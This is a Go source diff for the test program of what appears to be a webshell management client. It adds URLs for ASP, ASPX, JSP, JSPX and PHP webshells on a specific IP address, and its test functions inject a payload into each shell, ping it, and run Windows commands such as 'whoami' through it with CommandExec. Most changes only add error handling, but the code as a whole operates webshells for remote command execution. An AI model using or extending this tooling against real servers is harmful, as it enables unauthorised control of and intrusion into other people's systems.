@@ -9,16 +9,16 @@ import (
 )
 
 const (
-	AspRawShellUrl   = "http://***REMOVED***:8081/xorraw.asp"
-	AspBs64ShellUrl  = "http://***REMOVED***:8081/xorbs64.asp"
-	AspxBs64ShellUrl = "http://***REMOVED***:8081/bs64.aspx"
-	AspxRawShellUrl  = "http://***REMOVED***:8081/raw.aspx"
-	JspBs64ShellUrl  = "http://***REMOVED***:8080/bs64.jsp"
-	JspRawShellUrl   = "http://***REMOVED***:8080/raw.jsp"
-	JspxBs64ShellUrl = "http://***REMOVED***:8080/bs64.jspx"
-	JspxRawShellUrl  = "http://***REMOVED***:8080/raw.jspx"
-	PhpBs64ShellUrl  = "http://***REMOVED***/bs64.php"
-	PhpRawShellUrl   = "http://***REMOVED***/raw.php"
+	AspRawShellUrl   = "http://139.196.175.86:8081/xorraw.asp"
+	AspBs64ShellUrl  = "http://139.196.175.86:8081/xorbs64.asp"
+	AspxBs64ShellUrl = "http://139.196.175.86:8081/bs64.aspx"
+	AspxRawShellUrl  = "http://139.196.175.86:8081/raw.aspx"
+	JspBs64ShellUrl  = "http://139.196.175.86:8080/bs64.jsp"
+	JspRawShellUrl   = "http://139.196.175.86:8080/raw.jsp"
+	JspxBs64ShellUrl = "http://139.196.175.86:8080/bs64.jspx"
+	JspxRawShellUrl  = "http://139.196.175.86:8080/raw.jspx"
+	PhpBs64ShellUrl  = "http://139.196.175.86/bs64.php"
+	PhpRawShellUrl   = "http://139.196.175.86/raw.php"
 )
 
 func main() {
@@ -27,17 +27,17 @@ func main() {
 	testJspBs64()
 	testJspRaw()
 
-	log.Println("Jspx")
-	testJspxBs64()
-	testJspxRaw()
-
-	log.Println("Aspx")
-	testAspxBs64()
-	testAspxRaw()
-
-	log.Println("Asp")
-	testAspBs64()
-	testAspRaw()
+	//log.Println("Jspx")
+	//testJspxBs64()
+	//testJspxRaw()
+	//
+	//log.Println("Aspx")
+	//testAspxBs64()
+	//testAspxRaw()
+	//
+	//log.Println("Asp")
+	//testAspBs64()
+	//testAspRaw()
 
 	//log.Println("Php")
 	//testPhpBs64()
@@ -60,9 +60,18 @@ func testPhpBs64() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -82,9 +91,15 @@ func testPhpRaw() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -104,9 +119,15 @@ func testAspxBs64() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -126,9 +147,15 @@ func testAspxRaw() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -148,9 +175,15 @@ func testAspBs64() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -170,9 +203,15 @@ func testAspRaw() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -192,9 +231,15 @@ func testJspxBs64() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -214,9 +259,15 @@ func testJspxRaw() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
 }
 
@@ -236,15 +287,24 @@ func testJspBs64() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
-	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
-	//fmt.Println("Info : ", basicInfo1)
+	basicInfo1, err := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`)
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Printf("Info : %#+v\n", basicInfo1.ToString())
 
-	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
-	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami /"`)
+	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&print 1"`)
+	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami /"`)
 	//fmt.Println("Info : ", basicInfo)
 }
 
@@ -264,14 +324,24 @@ func testJspRaw() {
 	if err != nil {
 		log.Println(err)
 	}
-	g.InjectPayload()
+	err = g.InjectPayload()
+	if err != nil {
+		log.Println(err)
+	}
 
-	isAlive := g.Ping()
+	isAlive, err := g.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(isAlive)
-	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
-	//fmt.Println("Info : ", basicInfo1)
+	//basicInfo1, err := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`)
+	basicInfo1, err := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami"`)
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Printf("Info : %#+v\n", basicInfo1.ToString())
 
-	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
-	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami /"`)
+	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&print 1"`)
+	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami /"`)
 	//fmt.Println("Info : ", basicInfo)
 }
